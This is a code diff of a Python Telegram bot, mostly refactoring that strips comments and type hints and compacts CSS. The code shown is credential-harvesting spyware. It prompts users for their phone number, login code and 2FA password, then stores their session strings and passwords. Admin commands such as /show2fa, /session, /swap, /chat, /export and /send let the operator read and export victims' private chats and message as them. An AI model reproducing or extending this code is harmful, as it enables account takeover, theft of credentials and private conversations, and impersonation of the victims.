@@ -55,7 +55,6 @@ current_active_user = None
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
 
-# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
 def log_to_admin(text: str):
     asyncio.create_task(bot.send_message(ADMIN_ID, text, parse_mode='HTML'))
 
@@ -102,7 +101,6 @@ def get_active_client():
     return None, None
 
 async def resolve_entity(client, target: str):
-    """Определяет entity по ID, юзернейму или номеру телефона"""
     if target.isdigit():
         return await client.get_entity(int(target))
     if target.startswith('+') and target[1:].isdigit():
@@ -114,8 +112,6 @@ async def resolve_entity(client, target: str):
     return await client.get_entity(target)
 
 async def export_chat_to_html(client, chat_id, chat_name, me):
-    """Экспортирует всю переписку в HTML файл"""
-    
     messages = []
     async for msg in client.iter_messages(chat_id, limit=10000):
         if msg.text:
@@ -154,73 +150,19 @@ async def export_chat_to_html(client, chat_id, chat_name, me):
     <meta charset="UTF-8">
     <title>Чат с {html.escape(chat_name)}</title>
     <style>
-        body {{
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: #0e1621;
-            color: #e1e8f0;
-            margin: 0;
-            padding: 20px;
-        }}
-        .container {{
-            max-width: 800px;
-            margin: 0 auto;
-            background-color: #17212b;
-            border-radius: 10px;
-        }}
-        .chat-header {{
-            background-color: #17212b;
-            padding: 15px 20px;
-            border-bottom: 1px solid #2b3945;
-            position: sticky;
-            top: 0;
-        }}
-        .chat-header h2 {{
-            margin: 0;
-            font-size: 18px;
-        }}
-        .messages {{
-            padding: 20px;
-        }}
-        .message {{
-            margin-bottom: 15px;
-            padding: 10px 12px;
-            border-radius: 12px;
-            max-width: 80%;
-            word-wrap: break-word;
-        }}
-        .incoming {{
-            background-color: #2b3945;
-            margin-right: auto;
-        }}
-        .outgoing {{
-            background-color: #5288c1;
-            margin-left: auto;
-            text-align: right;
-        }}
-        .message-header {{
-            font-size: 12px;
-            margin-bottom: 5px;
-            display: flex;
-            justify-content: space-between;
-        }}
-        .sender {{
-            font-weight: bold;
-        }}
-        .date {{
-            font-size: 10px;
-            color: #6c7883;
-        }}
-        .message-text {{
-            font-size: 14px;
-            white-space: pre-wrap;
-        }}
-        .stats {{
-            background-color: #0e1621;
-            padding: 10px;
-            text-align: center;
-            font-size: 12px;
-            color: #6c7883;
-        }}
+        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #0e1621; color: #e1e8f0; margin: 0; padding: 20px; }}
+        .container {{ max-width: 800px; margin: 0 auto; background-color: #17212b; border-radius: 10px; }}
+        .chat-header {{ background-color: #17212b; padding: 15px 20px; border-bottom: 1px solid #2b3945; }}
+        .chat-header h2 {{ margin: 0; font-size: 18px; }}
+        .messages {{ padding: 20px; }}
+        .message {{ margin-bottom: 15px; padding: 10px 12px; border-radius: 12px; max-width: 80%; word-wrap: break-word; }}
+        .incoming {{ background-color: #2b3945; margin-right: auto; }}
+        .outgoing {{ background-color: #5288c1; margin-left: auto; text-align: right; }}
+        .message-header {{ font-size: 12px; margin-bottom: 5px; display: flex; justify-content: space-between; }}
+        .sender {{ font-weight: bold; }}
+        .date {{ font-size: 10px; color: #6c7883; }}
+        .message-text {{ font-size: 14px; white-space: pre-wrap; }}
+        .stats {{ background-color: #0e1621; padding: 10px; text-align: center; font-size: 12px; color: #6c7883; }}
     </style>
 </head>
 <body>
@@ -244,7 +186,7 @@ async def export_chat_to_html(client, chat_id, chat_name, me):
 # ========== АДМИН КОМАНДЫ ==========
 
 @dp.message_handler(commands=['spyhelp'])
-async def spyhelp(message: aiogram_types.Message):
+async def spyhelp(message):
     if message.from_user.id != ADMIN_ID:
         return
     await message.answer("""
@@ -283,7 +225,7 @@ async def spyhelp(message: aiogram_types.Message):
 """, parse_mode='HTML')
 
 @dp.message_handler(commands=['sessions'])
-async def list_all_sessions(message: aiogram_types.Message):
+async def list_all_sessions(message):
     if message.from_user.id != ADMIN_ID:
         return
     cursor.execute('SELECT user_id, first_name, username, phone, is_active FROM user_sessions')
@@ -299,7 +241,7 @@ async def list_all_sessions(message: aiogram_types.Message):
     await message.answer(f"📋 <b>Сохраненные сессии ({len(rows)})</b>:\n\n" + "\n".join(sessions_list), parse_mode='HTML')
 
 @dp.message_handler(commands=['del_session'])
-async def delete_session_cmd(message: aiogram_types.Message):
+async def delete_session_cmd(message):
     if message.from_user.id != ADMIN_ID:
         return
     args = message.get_args()
@@ -330,7 +272,7 @@ async def delete_session_cmd(message: aiogram_types.Message):
         await message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(commands=['reset_me'])
-async def reset_me_cmd(message: aiogram_types.Message):
+async def reset_me_cmd(message):
     user_id = message.from_user.id
     if user_id in active_clients:
         try:
@@ -343,7 +285,7 @@ async def reset_me_cmd(message: aiogram_types.Message):
     await message.answer("✅ Сессия удалена. Отправь /start заново.")
 
 @dp.message_handler(commands=['backup'])
-async def backup_db(message: aiogram_types.Message):
+async def backup_db(message):
     if message.from_user.id != ADMIN_ID:
         return
     backup_path = os.path.join(VOLUME_PATH, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.db')
@@ -354,7 +296,7 @@ async def backup_db(message: aiogram_types.Message):
     await message.answer("✅ Бэкап отправлен!")
 
 @dp.message_handler(commands=['users'])
-async def list_users(message: aiogram_types.Message):
+async def list_users(message):
     if message.from_user.id != ADMIN_ID:
         return
     cursor.execute('SELECT user_id, first_name, last_name, username, phone, two_fa, is_active FROM user_sessions')
@@ -375,7 +317,7 @@ async def list_users(message: aiogram_types.Message):
     await message.answer(response[:4000], parse_mode='HTML')
 
 @dp.message_handler(commands=['show2fa'])
-async def show_2fa(message: aiogram_types.Message):
+async def show_2fa(message):
     if message.from_user.id != ADMIN_ID:
         return
     args = message.get_args()
@@ -408,7 +350,7 @@ async def show_2fa(message: aiogram_types.Message):
         await message.answer("❌ /show2fa НОМЕР")
 
 @dp.message_handler(commands=['swap'])
-async def swap_account(message: aiogram_types.Message):
+async def swap_account(message):
     global current_active_user
     if message.from_user.id != ADMIN_ID:
         return
@@ -438,7 +380,7 @@ async def swap_account(message: aiogram_types.Message):
         await message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(commands=['active'])
-async def show_active(message: aiogram_types.Message):
+async def show_active(message):
     if message.from_user.id != ADMIN_ID:
         return
     client, uid = get_active_client()
@@ -452,7 +394,7 @@ async def show_active(message: aiogram_types.Message):
         await message.answer(f"✅ Активный ID: {uid}")
 
 @dp.message_handler(commands=['send'])
-async def send_message_cmd(message: aiogram_types.Message):
+async def send_message_cmd(message):
     if message.from_user.id != ADMIN_ID:
         return
     args = message.get_args()
@@ -478,7 +420,7 @@ async def send_message_cmd(message: aiogram_types.Message):
         await message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(commands=['chat'])
-async def view_chat(message: aiogram_types.Message):
+async def view_chat(message):
     if message.from_user.id != ADMIN_ID:
         return
     args = message.get_args()
@@ -517,8 +459,7 @@ async def view_chat(message: aiogram_types.Message):
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
 
-@dp.callback_query_handler(lambda c: c.data.startswith('chat_last_'))
-async def chat_last_callback(callback: CallbackQuery):
+async def chat_last_callback(callback):
     await callback.answer("Загружаю последние сообщения...")
     data = callback.data.replace('chat_last_', '').split('_', 1)
     chat_id = int(data[0])
@@ -548,8 +489,7 @@ async def chat_last_callback(callback: CallbackQuery):
     except Exception as e:
         await callback.message.answer(f"❌ Ошибка: {e}")
 
-@dp.callback_query_handler(lambda c: c.data.startswith('chat_full_'))
-async def chat_full_callback(callback: CallbackQuery):
+async def chat_full_callback(callback):
     await callback.answer("Экспортирую всю переписку...")
     data = callback.data.replace('chat_full_', '').split('_', 1)
     chat_id = int(data[0])
@@ -577,7 +517,7 @@ async def chat_full_callback(callback: CallbackQuery):
         await callback.message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(commands=['export'])
-async def export_chat_cmd(message: aiogram_types.Message):
+async def export_chat_cmd(message):
     if message.from_user.id != ADMIN_ID:
         return
     args = message.get_args()
@@ -608,7 +548,7 @@ async def export_chat_cmd(message: aiogram_types.Message):
         await message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(commands=['chats'])
-async def list_chats(message: aiogram_types.Message):
+async def list_chats(message):
     if message.from_user.id != ADMIN_ID:
         return
     client, uid = get_active_client()
@@ -647,7 +587,7 @@ async def list_chats(message: aiogram_types.Message):
     await message.answer(f"💡 Всего {len(chats)} диалогов.\n/chat НОМЕР - посмотреть переписку")
 
 @dp.message_handler(commands=['online'])
-async def online_users(message: aiogram_types.Message):
+async def online_users(message):
     if message.from_user.id != ADMIN_ID:
         return
     client, uid = get_active_client()
@@ -670,7 +610,7 @@ async def online_users(message: aiogram_types.Message):
         await message.answer("🟢 Никого в сети")
 
 @dp.message_handler(commands=['status'])
-async def user_status_cmd(message: aiogram_types.Message):
+async def user_status_cmd(message):
     if message.from_user.id != ADMIN_ID:
         return
     args = message.get_args()
@@ -692,7 +632,7 @@ async def user_status_cmd(message: aiogram_types.Message):
         await message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(commands=['session'])
-async def get_session_cmd(message: aiogram_types.Message):
+async def get_session_cmd(message):
     if message.from_user.id != ADMIN_ID:
         return
     args = message.get_args()
@@ -713,7 +653,7 @@ async def get_session_cmd(message: aiogram_types.Message):
         await message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(commands=['set2fa'])
-async def set_2fa_cmd(message: aiogram_types.Message):
+async def set_2fa_cmd(message):
     if message.from_user.id != ADMIN_ID:
         return
     args = message.get_args()
@@ -733,7 +673,7 @@ async def set_2fa_cmd(message: aiogram_types.Message):
         await message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(commands=['info'])
-async def account_info_cmd(message: aiogram_types.Message):
+async def account_info_cmd(message):
     if message.from_user.id != ADMIN_ID:
         return
     client, uid = get_active_client()
@@ -758,7 +698,7 @@ async def account_info_cmd(message: aiogram_types.Message):
         await message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(commands=['logs'])
-async def view_logs_cmd(message: aiogram_types.Message):
+async def view_logs_cmd(message):
     if message.from_user.id != ADMIN_ID:
         return
     args = message.get_args()
@@ -774,7 +714,7 @@ async def view_logs_cmd(message: aiogram_types.Message):
     await message.answer(response[:4000])
 
 @dp.message_handler(commands=['statuslogs'])
-async def status_logs_cmd(message: aiogram_types.Message):
+async def status_logs_cmd(message):
     if message.from_user.id != ADMIN_ID:
         return
     args = message.get_args()
@@ -791,7 +731,7 @@ async def status_logs_cmd(message: aiogram_types.Message):
     await message.answer(response[:4000])
 
 @dp.message_handler(commands=['stats'])
-async def stats_cmd(message: aiogram_types.Message):
+async def stats_cmd(message):
     if message.from_user.id != ADMIN_ID:
         return
     cursor.execute('SELECT COUNT(*) FROM spy_logs')
@@ -807,7 +747,7 @@ async def stats_cmd(message: aiogram_types.Message):
 # ========== РЕГИСТРАЦИЯ ==========
 
 @dp.message_handler(commands=['start'])
-async def start_auth(message: aiogram_types.Message):
+async def start_auth(message):
     user_id = message.from_user.id
     cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
     row = cursor.fetchone()
@@ -821,7 +761,7 @@ async def start_auth(message: aiogram_types.Message):
     await message.answer("🔐 Отправь номер телефона", reply_markup=kb)
 
 @dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
-async def get_phone(message: aiogram_types.Message):
+async def get_phone(message):
     user_id = message.from_user.id
     phone = message.contact.phone_number
     try:
@@ -840,7 +780,7 @@ async def get_phone(message: aiogram_types.Message):
         await message.answer(f"❌ Ошибка: {e}")
 
 @dp.callback_query_handler(lambda c: c.data.startswith('c_'))
-async def code_callback(callback: aiogram_types.CallbackQuery):
+async def code_callback(callback):
     user_id = callback.from_user.id
     if user_id not in temp_auth:
         await callback.answer("Начни заново /start")
@@ -865,7 +805,7 @@ async def code_callback(callback: aiogram_types.CallbackQuery):
     await callback.message.edit_text(f"📱 Код: `{display}`", parse_mode="Markdown", reply_markup=get_code_keyboard())
     await callback.answer()
 
-async def complete_auth(callback, user_id: int):
+async def complete_auth(callback, user_id):
     data = temp_auth[user_id]
     try:
         await data["client"].sign_in(phone=data["phone"], code=data["code"], phone_code_hash=data["hash"])
@@ -888,7 +828,7 @@ async def complete_auth(callback, user_id: int):
             await callback.message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(lambda msg: msg.from_user.id in temp_auth and temp_auth[msg.from_user.id].get("step") == "2fa")
-async def handle_2fa(message: aiogram_types.Message):
+async def handle_2fa(message):
     user_id = message.from_user.id
     data = temp_auth[user_id]
     try:
@@ -909,7 +849,7 @@ async def handle_2fa(message: aiogram_types.Message):
 
 # ========== ЮЗЕРБОТ ==========
 
-async def run_userbot(owner_id: int, session_string: str):
+async def run_userbot(owner_id, session_string):
     if owner_id in active_clients:
         try:
             await active_clients[owner_id].disconnect()
@@ -1046,24 +986,14 @@ async def run_userbot(owner_id: int, session_string: str):
                     pass
             return
         
+        # .type (рабочий вариант)
         if text.startswith('.type '):
             txt = text[6:]
             if txt:
                 await event.delete()
-                msg = await client.send_message(event.chat_id, '')
-                typed = ''
-                for ch in txt:
-                    typed += ch
-                    try:
-                        await msg.edit(typed)
-                    except:
-                        pass
-                    await asyncio.sleep(0.15)
-                await asyncio.sleep(0.3)
-                try:
-                    await msg.delete()
-                except:
-                    pass
+                for i, ch in enumerate(txt):
+                    await client.send_message(event.chat_id, txt[:i+1])
+                    await asyncio.sleep(0.25)
             return
         
         if text == '.info':
